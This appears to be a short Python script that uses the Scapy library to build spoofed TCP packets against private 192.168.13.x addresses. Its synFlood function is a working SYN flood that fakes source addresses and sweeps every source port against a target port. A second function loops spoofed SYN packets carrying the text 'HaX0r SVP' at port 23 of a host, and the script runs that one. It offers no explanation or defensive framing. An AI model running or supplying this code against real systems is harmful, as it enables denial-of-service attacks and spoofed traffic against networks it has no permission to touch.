# -*- coding: UTF-8 -*-
 

import os
import copy
path = os.path.dirname(__file__)
os.chdir(path)

from scapy.all import *


def synFlood(tgt,dPort):
    srcList = ['192.168.13.160','192.168.13.148']
    for sPort in range(1024,65535):
        index = random.randrange(2)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
        packet = ipLayer / tcpLayer 
        send(packet)


def sendpacket3(tar):
    p = IP(dst=tar, src='192.168.13.160',id=1111, ttl=64) / TCP(sport=RandShort(), dport=23, seq=12345, ack=1000, window=1000,
                                           flags="S") / "HaX0r SVP"
    ans, unans = srloop(p, inter=0.1, retry=2, timeout=1)
    ans.summary()
    unans.summary()



sendpacket3('192.168.13.100')
#synFlood('192.168.13.159',23)